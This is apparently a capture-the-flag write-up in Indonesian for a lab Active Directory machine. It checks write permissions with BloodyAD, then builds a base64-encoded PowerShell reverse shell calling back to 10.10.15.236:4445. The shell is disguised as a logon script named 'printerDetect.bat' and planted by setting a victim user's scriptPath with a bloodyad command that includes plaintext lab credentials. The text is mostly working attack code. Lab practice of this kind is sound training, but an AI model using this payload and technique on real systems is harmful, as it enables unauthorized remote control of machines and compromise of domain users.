# 1. Deteksi
## a. Cek BloodyAd
cari baris yang menunjuk ke objek `CN=<TargetUser>,CN=Users,DC=...` dengan permission `WRITE`
![](Attachments/Pasted%20image%2020260804102117.png)
## b. Cek folder script di directory SYSVOL SMB
![](Attachments/Pasted%20image%2020260804101828.png)
# 2. Eksploitasi
## a. Buat payload
Komputer menjalankan script yang ada di folder script, maka kita akan mengupload payload backdoornya
```shell
# membuat payload
PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("10.10.15.236",4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

# ubah ke echo
B64=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w 0)

# kirim
cat > printerDetect.bat << EOF 
@echo off
powershell -enc $B64 
EOF
```
![](Attachments/Pasted%20image%2020260804134727.png)
## b. kirim payload
![](Attachments/Pasted%20image%2020260804135534.png)
## c. aktifikasi scriptPath
```shell
bloodyad --host 10.129.244.207 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
```
![](Attachments/Pasted%20image%2020260804135407.png)
## d. set listener and get shell
